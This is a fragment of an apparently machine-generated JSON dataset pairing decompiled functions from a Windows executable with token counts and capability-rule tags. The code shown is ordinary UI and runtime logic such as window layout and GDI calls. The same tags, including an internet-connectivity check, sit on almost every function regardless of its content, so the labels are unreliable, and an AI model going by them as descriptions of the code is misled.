        "decompiled_code": "\nvoid __cdecl fcn.00434a44(int32_t arg_8h)\n\n{\n    char in_AL;\n    \n    *(arg_8h + -4) = 0xff000014;\n    if (in_AL == '\\x01') {\n        *(arg_8h + -4) = 0xff000010;\n    }\n    *(arg_8h + -8) = 0xff000010;\n    if (in_AL == '\\x01') {\n        *(arg_8h + -8) = 0xff000014;\n    }\n    return;\n}\n",
        "token_count": 124
    },
    "00434d00": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00434d00(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    if (*(in_EAX + 0x17) == '\\0') {\n        puStack44 = 0x434e34;\n        fcn.0044bda8();\n    }\n    else {\n        *(in_EAX + 0x96) = 1;\n        uStack48 = 0x434e22;\n        uStack52 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffcc;\n        iVar2 = *(param_2 + 4);\n        cVar1 = *(in_EAX + 0x5b);\n        if (cVar1 == '\\x01') {\n            puVar3 = &stack0xfffffffc;\n            if (in_EAX[0x13] == 0) {\n                fcn.00444ca0();\n                puVar3 = puStack44;\n            }\n        }\n        else if (cVar1 == '\\x02') {\n            puVar3 = &stack0xfffffffc;\n            if (in_EAX[0x13] == 0) {\n                puStack44 = &stack0xfffffffc;\n                (**(*in_EAX + 0x88))(*(iVar2 + 0x58) - *(iVar2 + 0x50), in_EAX[0x12]);\n                puVar3 = puStack44;\n            }\n        }\n        else if (cVar1 == '\\x03') {\n            puVar3 = &stack0xfffffffc;\n            if (in_EAX[0x12] == 0) {\n                puStack44 = &stack0xfffffffc;\n                fcn.00444c6c();\n                puVar3 = puStack44;\n            }\n        }\n        else {\n            puVar3 = &stack0xfffffffc;\n            if ((cVar1 == '\\x04') && (puVar3 = &stack0xfffffffc,  in_EAX[0x12] == 0)) {\n                puStack44 = &stack0xfffffffc;\n                (**(*in_EAX + 0x88))(in_EAX[0x13], *(iVar2 + 0x54) - *(iVar2 + 0x4c));\n                puVar3 = puStack44;\n            }\n        }\n        puStack44 = puVar3;\n        fcn.0044bda8();\n        fcn.00404878();\n    }\n    return;\n}\n",
        "token_count": 638
    },
    "004350e8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004350e8(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    if (*(in_EAX + 0x260) == '\\0') {\n        *(in_EAX + 0x260) = 1;\n        uStack28 = 0x43514d;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &uStack32;\n        if ((*(param_2 + 6) == 0) || (*(param_2 + 6) == 5)) {\n            cVar1 = (**(**(in_EAX + 0x30) + 0xdc))();\n            if (cVar1 != '\\0') {\n                fcn.0042ed80();\n            }\n        }\n        *in_FS_OFFSET = uStack32;\n        *(in_EAX + 0x260) = 0;\n    }\n    return;\n}\n",
        "token_count": 255
    },
    "004351e8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.004351e8(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_2 = extraout_DL;\n    }\n    fcn.0042ca80();\n    *(in_EAX + 0x50) = *0x435274;\n    uVar1 = fcn.00403f28();\n    *(in_EAX + 600) = uVar1;\n    iVar2 = fcn.00403f28();\n    *(in_EAX + 0x25c) = iVar2;\n    *(iVar2 + 0x2c) = in_EAX;\n    *(iVar2 + 0x28) = 0x435498;\n    *(in_EAX + 0x260) = 0xffffffff;\n    *(in_EAX + 0x264) = 1;\n    if (param_2 != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 308
    },
    "004352c8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004352c8(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    uint *in_FS_OFFSET;\n    uint uStack156;\n    uint uStack152;\n    uchar *puStack148;\n    int32_t iStack144;\n    int32_t iStack140;\n    int32_t iStack136;\n    int32_t iStack132;\n    uint uStack128;\n    int32_t iStack124;\n    uint *puStack120;\n    int32_t iStack116;\n    uint uStack112;\n    uint uStack108;\n    int32_t lptm;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uint hWinPosInfo;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if ((*(*(in_EAX + 600) + 8) != 0) && (*(in_EAX + 0x268) == '\\0')) {\n        uStack108 = 0;\n        uStack112 = 0x4352f7;\n        iVar2 = sub.user32.dll_GetDC();\n        uStack112 = 0x435301;\n        uStack112 = fcn.00420c58();\n        puStack120 = 0x435308;\n        iStack116 = iVar2;\n        uVar3 = sub.gdi32.dll_SelectObject();\n        puStack120 = &fcn.004352c8::lptm;\n        uStack128 = 0x435314;\n        iStack124 = iVar2;\n        sub.gdi32.dll_GetTextMetricsA();\n        iStack136 = 0x43531b;\n        iStack132 = iVar2;\n        uStack128 = uVar3;\n        sub.gdi32.dll_SelectObject();\n        iStack140 = 0;\n        iStack144 = 0x435323;\n        iStack136 = iVar2;\n        sub.user32.dll_ReleaseDC();\n        iStack144 = *(*(in_EAX + 600) + 8);\n        var_8h = *(in_EAX + 0x264);\n        var_4h = (iStack144 + var_8h + -1) / var_8h;\n        var_8h = (*(in_EAX + 0x48) + -10) / var_8h;\n        var_14h = (*(in_EAX + 0x4c) - lptm) + -5;\n        var_ch = var_14h / var_4h;\n        var_10h = var_14h % var_4h >> 1;\n        if (var_10h < 0) {\n            var_10h = var_10h + ((var_14h % var_4h & 1U) != 0);\n        }\n        var_10h = var_10h + lptm + 1;\n        puStack148 = 0x43537b;\n        hWinPosInfo = sub.user32.dll_BeginDeferWindowPos();\n        uStack152 = 0x435452;\n        uStack156 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff64;\n        iVar2 = *(*(in_EAX + 600) + 8);\n        if (-1 < iVar2 + -1) {\n            var_14h = 0;\n            puStack148 = &stack0xfffffffc;\n            var_20h = iVar2;\n            do {\n                piVar4 = fcn.00414eec();\n                (**(*piVar4 + 0x74))();\n                var_1ch = (var_14h / var_4h) * var_8h + 8;\n                uStack128 = 0x4353df;\n                cVar1 = fcn.00404154();\n                if (cVar1 != '\\0') {\n                    uStack128 = 0x4353ea;\n                    iVar2 = fcn.00444f18();\n                    var_1ch = (iVar2 - var_1ch) - var_8h;\n                }\n                uStack128 = 0x14;\n                iStack132 = var_ch;\n                iStack136 = var_8h;\n                iStack140 = (var_14h % var_4h) * var_ch + var_10h;\n                iStack144 = var_1ch;\n                puStack148 = NULL;\n                uStack152 = 0x435419;\n                uStack152 = fcn.0044d1c8();\n                uStack156 = hWinPosInfo;\n                hWinPosInfo = sub.user32.dll_DeferWindowPos();\n                fcn.004454cc();\n                var_14h = var_14h + 1;\n                var_20h = var_20h + -1;\n            } while (var_20h != 0);\n        }\n        *in_FS_OFFSET = uStack156;\n        puStack148 = 0x435459;\n        uStack152 = hWinPosInfo;\n        uStack156 = 0x435451;\n        sub.user32.dll_EndDeferWindowPos();\n        return;\n    }\n    return;\n}\n",
        "token_count": 1161
    },
    "00435610": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00435610(void)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x4356dc;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    (**(*in_EAX[0x97] + 0x14))();\n    fcn.0043550c();\n    var_4h = *(in_EAX[0x96] + 8);\n    if (-1 < var_4h + -1) {\n        do {\n            (**(*in_EAX[0x97] + 0xc))();\n            fcn.00414eec(0);\n            fcn.004455dc();\n            var_4h = var_4h + -1;\n        } while (var_4h != 0);\n    }\n    if (-1 < in_EAX[0x98]) {\n        *(in_EAX + 0x269) = 1;\n        piVar1 = fcn.00414eec();\n        (**(*piVar1 + 0xdc))();\n        *(in_EAX + 0x269) = 0;\n    }\n    fcn.004352c8();\n    (**(*in_EAX + 0x80))();\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x4356e3;\n    uStack32 = 0x4356db;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 383
    },
    "00435994": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00435994(uint param_1, char param_2)\n\n{\n    int32_t *piVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    \n    if (*(in_EAX + 0x270) != 0) {\n        *(in_EAX + 0x274) = param_2;\n        if (param_2 == '\\0') {\n            fcn.00435810();\n            fcn.00413a6c();\n        }\n        else if (param_2 == '\\x01') {\n            fcn.00413a6c();\n        }\n        else if (param_2 == '\\x02') {\n            iVar2 = fcn.00435810();\n            uVar4 = *(in_EAX + 0x4c) - iVar2;\n            iVar2 = uVar4 >> 1;\n            if (iVar2 < 0) {\n                iVar2 = iVar2 + ((uVar4 & 1) != 0);\n            }\n            fcn.0043581c(iVar2 + *(in_EAX + 0x44));\n            fcn.00413a6c();\n        }\n        else if (param_2 == '\\x03') {\n            fcn.00435810();\n            fcn.00413a6c();\n        }\n        piVar1 = *(in_EAX + 0x270);\n        uVar3 = fcn.0043581c();\n        uVar3 = fcn.00435810(uVar3);\n        (**(*piVar1 + 0x88))(uVar3);\n    }\n    return;\n}\n",
        "token_count": 367
    },
    "00435ab4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00435ab4(void)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    bool bVar3;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x435b65;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puVar1 = &stack0xfffffffc;\n    if (((*(in_EAX + 0x1c) & 0x10) != 0) && (puVar1 = &stack0xfffffffc,  *(in_EAX + 0x270) != 0)) {\n        iVar2 = fcn.0044551c();\n        if (iVar2 != 0) {\n            fcn.004455ac();\n            iVar2 = fcn.00408ac0();\n            puVar1 = puStack28;\n            if (iVar2 != 0) goto code_r0x00435b18;\n        }\n        fcn.004455dc();\n        puVar1 = puStack28;\n    }\ncode_r0x00435b18:\n    puStack28 = puVar1;\n    bVar3 = (*(in_EAX + 0x1c) & 0x10) != 0;\n    if (bVar3) {\n        fcn.004455ac();\n    }\n    fcn.00445394();\n    if (bVar3) {\n        fcn.004455dc();\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x435b6c;\n    uStack32 = 0x435b64;\n    fcn.00404dc4();\n    return;\n}\n",
        "token_count": 416
    },
    "0043697c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0043697c(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x5a) != 0) {\n        (**(in_EAX + 0x58))();\n    }\n    return;\n}\n",
        "token_count": 58
    },
    "00436c24": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00436c24(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x92) != 0) {\n        (**(in_EAX + 0x90))();\n    }\n    return;\n}\n",
        "token_count": 57
    },
    "00436d5c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00436f6f)\n\nvoid __fastcall fcn.00436d5c(uint param_1)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t *puVar5;\n    uint *in_FS_OFFSET;\n    bool bVar6;\n    uint uStack132;\n    uint uStack128;\n    uchar *puStack124;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_40h;\n    uint var_3ch;\n    uint32_t var_38h;\n    uint var_30h;\n    uint var_28h;\n    uint var_24h;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack124 = &stack0xfffffffc;\n    uStack128 = 0x437064;\n    uStack132 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff7c;\n    (**(*in_EAX[0x21] + 0x44))();\n    fcn.00403720();\n    fcn.00436d04();\n    fcn.00405264();\n    iVar1 = in_EAX[0x1b];\n    in_EAX[0x1c] = iVar1;\n    fcn.004054ec();\n    fcn.00405264();\n    fcn.00403720();\n    fcn.00405264();\n    fcn.004095dc();\n    if ((in_EAX[0x1d] != 0) || (*0x4913a8 == '\\0')) {\n        fcn.00405264();\n    }\n    fcn.00405264();\n    var_38h = 0x20;\n    uVar3 = 0;\n    puVar5 = 0x4913b4;\n    do {\n        bVar6 = uVar3 < 0x1f;\n        if (uVar3 < 0x20) {\n            bVar6 = (*(in_EAX + ((uVar3 & 0x7f) >> 3) + 100) >> (uVar3 & 7) & 1) != 0;\n        }\n        if (bVar6) {\n            var_38h = var_38h | *puVar5;\n        }\n        uVar3 = uVar3 + 1;\n        puVar5 = puVar5 + 1;\n    } while (uVar3 != '\\x16');\n    if (**0x492a6c == '\\0') {\n        var_38h = var_38h & 0xfff7ffff;\n    }\n    else {\n        var_38h = var_38h ^ 0x80000;\n        if (((4 < **0x4929cc) && (**0x492cfc == 2)) || ((**0x492cfc == 1 && ((3 < **0x4929cc && (0x59 < **0x492bbc))))))\n        {\n            cVar2 = '\\0';\n            do {\n                cVar2 = cVar2 + '\\x01';\n            } while (cVar2 != '\\x01');\n        }\n    }\n    fcn.00404e38();\n    if ((var_38h & 0x80000) == 0) {\n        fcn.00409454();\n        fcn.00405304();\n    }\n    if (*(**0x492b60 + 0xd4) != '\\0') {\n        iVar4 = fcn.004483a4();\n        in_EAX[0x10] = iVar4;\n        *(iVar4 + 0x250) = in_EAX;\n        *(iVar4 + 0x254) = param_1;\n        fcn.0044d1c8();\n    }\n    iVar4 = (**(*in_EAX + 0x38))();\n    if (iVar4 != 0) {\n        fcn.004371dc();\n        if ((var_38h & 0x400) == 0) {\n            in_EAX[0x19] = in_EAX[0x19] & 0xffffff7f;\n        }\n        else {\n            in_EAX[0x19] = in_EAX[0x19] | 0x80;\n        }\n        if ((var_38h & 1) == 0) {\n            in_EAX[0x19] = in_EAX[0x19] & 0xfffffffe;\n        }\n        else {\n            in_EAX[0x19] = in_EAX[0x19] | 1;\n        }\n        in_EAX[0x1b] = iVar1;\n    }\n    *in_FS_OFFSET = uStack132;\n    puStack124 = 0x43706b;\n    uStack128 = 0x437063;\n    fcn.00404dc4();\n    return;\n}\n",
        "token_count": 1147
    },
    "004371dc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004371dc(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack24 = &fcn.004371dc::var_1h + 1;\n    uStack28 = 0x437295;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    var_1h._0_1_ = 0;\n    if (((*(in_EAX + 100) & 0x40) != 0) && (((*(in_EAX + 0x66) & 1) != 0 || (**0x492a6c == '\\0')))) {\n        var_1h._0_1_ = 0x20;\n    }\n    if ((*(in_EAX + 100) & 0x40) == 0) {\n        fcn.00437078(&fcn.004371dc::var_1h + 1);\n        (**(**(in_EAX + 0x84) + 0x38))();\n    }\n    else {\n        puStack24 = &fcn.004371dc::var_1h + 1;\n        fcn.004370c0(&fcn.004371dc::var_1h + 1);\n        (**(**(in_EAX + 0x84) + 0xc))();\n        fcn.00404df4();\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x43729c;\n    uStack28 = 0x437294;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 419
    },
    "004372f8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004372f8(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uchar auStack272 [264];\n    \n    if ((**0x492a6c == '\\0') || (*(in_EAX + 0x3c) == 0)) {\n        fcn.00404df4();\n    }\n    else {\n        uVar1 = sub.user32.dll_GetParent(*(in_EAX + 0x3c), 0x465, 0x105, auStack272);\n        sub.user32.dll_SendMessageA(uVar1);\n        fcn.00409790();\n    }\n    return;\n}\n",
        "token_count": 142
    },
    "00437614": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00437614(void)\n\n{\n    uchar *puVar1;\n    uint32_t *in_FS_OFFSET;\n    uint32_t uStack20;\n    uint32_t uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x437667;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    *0x49648c = *0x49648c + 1;\n    if (*0x49648c == 0) {\n        puVar1 = &stack0xfffffffc;\n        if (*0x4913b0 != 0) {\n            uStack20 = *0x4913b0;\n            sub.kernel32.dll_GlobalDeleteAtom();\n            puVar1 = puStack8;\n        }\n        puStack8 = puVar1;\n        fcn.0040592c();\n    }\n    *in_FS_OFFSET = uStack20;\n    return;\n}\n",
        "token_count": 223
    },
    "004377dc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004377dc(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    \n    if (*0x4964cc != NULL) {\n        iVar2 = (**0x4964cc)(arg_8h, arg_ch, arg_10h, arg_14h);\n        if (iVar2 != 0) {\n            uVar1 = 1;\n            goto code_r0x00437808;\n        }\n    }\n    uVar1 = 0;\ncode_r0x00437808:\n    return -uVar1;\n}\n",
        "token_count": 148
    },
    "00437810": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00437810(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    \n    if (*0x4964d0 != NULL) {\n        iVar2 = (**0x4964d0)(arg_8h);\n        if (iVar2 != 0) {\n            uVar1 = 1;\n            goto code_r0x00437830;\n        }\n    }\n    uVar1 = 0;\ncode_r0x00437830:\n    return -uVar1;\n}\n",
        "token_count": 121
    },
    "00437d14": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t fcn.00437d14(void)\n\n{\n    if (*0x4964dc == 0) {\n        *0x4964dc = (**(*0x49147c + 4))();\n    }\n    return *0x4964dc;\n}\n",
        "token_count": 59
    },
    "00437ddc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00437ddc(uint param_1, uint32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if ((*(in_EAX + 6) != '\\0') && (*(in_EAX + 8 + (param_2 & 0xff) * 4) == 0)) {\n        uVar1 = (***0x492984)(0, *((param_2 & 0x7f) * 4 + 0x491484));\n        *(in_EAX + 8 + (param_2 & 0x7f) * 4) = uVar1;\n    }\n    return *(in_EAX + 8 + (param_2 & 0xff) * 4);\n}\n",
        "token_count": 171
    },
    "00437e1c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.00437e1c(void)\n\n{\n    int32_t in_EAX;\n    \n    if (((*(in_EAX + 5) != '\\0') && (*(in_EAX + 6) != '\\0')) && (*(in_EAX + 4) != '\\0')) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 77
    },
    "00437fb4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00437fb4(uint arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint in_ECX;\n    uint in_EDX;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((arg_ch == '\\0') || (arg_10h == 0)) {\n        cVar1 = '\\x01';\n    }\n    else {\n        uVar2 = fcn.00437ddc(*(arg_10h + 4), *(arg_10h + 8));\n        iVar3 = (***0x492968)(uVar2);\n        cVar1 = '\\x01' - (iVar3 == 0);\n    }\n    if (cVar1 != '\\0') {\n        (***0x492b38)(in_EDX, in_ECX, arg_8h);\n    }\n    return;\n}\n",
        "token_count": 213
    },
    "004388d8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004388d8(void)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 6) != '\\0') {\n        fcn.00437e48();\n    }\n    uVar1 = fcn.00429164();\n    *(in_EAX + 6) = uVar1;\n    return;\n}\n",
        "token_count": 83
    },
    "004388f4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004388f4(void)\n\n{\n    uchar *puVar1;\n    uint *in_FS_OFFSET;\n    uint uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x438939;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    *0x4964d8 = *0x4964d8 + 1;\n    if (*0x4964d8 == 0) {\n        puVar1 = &stack0xfffffffc;\n        if (**0x492880 == '\\0') {\n            fcn.00403f58();\n            puVar1 = puStack8;\n        }\n        puStack8 = puVar1;\n        fcn.00404da0();\n    }\n    *in_FS_OFFSET = uStack16;\n    return;\n}\n",
        "token_count": 200
    },
    "004398d8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_3h\n// WARNING: Could not reconcile some variable overlaps\n\nint16_t __fastcall fcn.004398d8(uint param_1, uint8_t param_2)\n\n{\n    int16_t in_AX;\n    int16_t iVar1;\n    uint var_3h;\n    \n    var_3h._2_1_ = in_AX >> 8;\n    iVar1 = 0;\n    if (var_3h._2_1_ == '\\0') {\n        if ((param_2 & 1) != 0) {\n            in_AX = in_AX + 0x2000;\n        }\n        if ((param_2 & 4) != 0) {\n            in_AX = in_AX + 0x4000;\n        }\n        iVar1 = in_AX;\n        if ((param_2 & 2) != 0) {\n            iVar1 = in_AX + -0x8000;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 220
    },
    "00439964": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
